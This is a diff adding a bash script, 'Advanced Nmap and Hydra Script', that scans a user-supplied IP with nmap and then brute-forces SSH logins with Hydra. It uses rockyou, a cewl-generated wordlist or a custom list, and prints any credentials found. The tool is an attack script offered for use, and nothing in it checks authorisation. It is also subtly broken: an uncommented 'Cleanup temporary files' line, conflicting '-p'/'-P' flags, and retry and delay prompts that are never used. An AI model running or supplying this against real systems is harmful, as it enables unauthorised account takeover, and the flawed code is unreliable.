@@ -1,0 +1,101 @@
+# Define constants
+WORDLIST_DIR="/path/to/wordlists"
+HYDRA_THREADS=8
+HYDRA_TIMEOUT=10
+
+# Display a banner
+echo "███████╗███╗   ███╗██╗███╗   ██╗███████╗██╗   ██╗██╗  ██╗"
+echo "██╔════╝████╗ ████║██║████╗  ██║██╔════╝██║   ██║╚██╗██╔╝"
+echo "█████╗  ██╔████╔██║██║██╔██╗ ██║█████╗  ██║   ██║ ╚███╔╝ "
+echo "██╔══╝  ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██║   ██║ ██╔██╗ "
+echo "███████╗██║ ╚═╝ ██║██║██║ ╚████║███████╗╚██████╔╝██╔╝ ██╗"
+echo "╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝"
+echo "Advanced Nmap and Hydra Script"
+echo
+
+# Display a prompt for the user to enter a target IP address
+read -p "Enter a target IP address: " ip_address
+
+# Check if the target IP address is valid
+if ! [[ "$ip_address" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+  echo "Invalid IP address"
+  exit 1
+fi
+
+# Run Nmap to scan for open ports and store the output in a variable
+echo "Scanning for open ports on $ip_address..."
+nmap_output=$(nmap -p- -T4 $ip_address)
+
+# Display the open ports in a user-friendly format
+echo "Open ports for $ip_address:"
+echo "$nmap_output" | grep 'open'
+
+# Check if an SSH server is open and prompt the user to run Hydra for password recovery
+if echo "$nmap_output" | grep -q '22/tcp open ssh'; then
+  read -p "An SSH server is open on $ip_address. Do you want to run Hydra for password recovery? (y/n) " run_hydra
+  if [[ "$run_hydra" =~ ^[Yy]$ ]]; then
+    echo "Type 'rockyou.txt' for rockyou wordlist. Type :'cewl.txt' for automatic wordlist creation. Type 'custom_wordlist.txt' to path your own wordlist."
+    select wordlist_name in "rockyou.txt" "cewl.txt" "custom_wordlist.txt"; do
+      case $wordlist_name in
+        "rockyou.txt")
+          wordlist_path="$WORDLIST_DIR/rockyou.txt"
+          break
+          ;;
+        "cewl.txt")
+          read -p "Enter a URL to crawl: " cewl_url
+          cewl_output="$WORDLIST_DIR/cewl_output.txt"
+          cewl $cewl_url -w $cewl_output
+          wordlist_path="$cewl_output"
+          break
+          ;;
+        "custom_wordlist.txt")
+          read -p "Enter the path to a custom wordlist: " custom_wordlist_path
+          wordlist_path="$custom_wordlist_path"
+break
+;;
+*)
+echo "Invalid input"
+exit 1
+;;
+esac
+done
+# Prompt user for additional Hydra options
+read -p "Enter additional Hydra options (e.g. -f for exit on first valid password): " hydra_options
+
+# Prompt user for SSH port number (default is 22)
+read -p "Enter SSH port number (default is 22): " ssh_port
+ssh_port=${ssh_port:-22} # If no input is provided, set the port to the default value
+
+# Prompt user for number of retries (default is 3)
+read -p "Enter the number of retries (default is 3): " retries
+retries=${retries:-3} # If no input is provided, set the number of retries to the default value
+
+# Prompt user for delay between retries (default is 1 second)
+read -p "Enter the delay between retries in seconds (default is 1): " delay
+delay=${delay:-1} # If no input is provided, set the delay to the default value
+
+# Prompt user for Hydra username format (default is 'user')
+read -p "Enter the Hydra username format (default is 'user'): " hydra_username
+hydra_username=${hydra_username:-user} # If no input is provided, set the Hydra username format to the default value
+
+# Prompt user for Hydra password format (default is 'password')
+read -p "Enter the Hydra password format (default is 'password'): " hydra_password
+hydra_password=${hydra_password:-password} # If no input is provided, set the Hydra password format to the default value
+
+echo "Running Hydra with wordlist $wordlist_name, $HYDRA_THREADS threads, and options '$hydra_options'..."
+hydra -l $hydra_username -p $hydra_password -P $wordlist_path -t $HYDRA_THREADS -s $ssh_port $hydra_options $ip_address ssh -o hydra_output.txt
+
+# Check if any credentials were found and display them to the user
+if grep -q "login:" hydra_output.txt; then
+  echo "The following credentials were found for $ip_address:"
+  cat hydra_output.txt
+else
+  echo "No valid credentials found."
+fi
+fi
+fi
+
+Cleanup temporary files
+rm -f hydra_output.txt
+
+echo "Done."
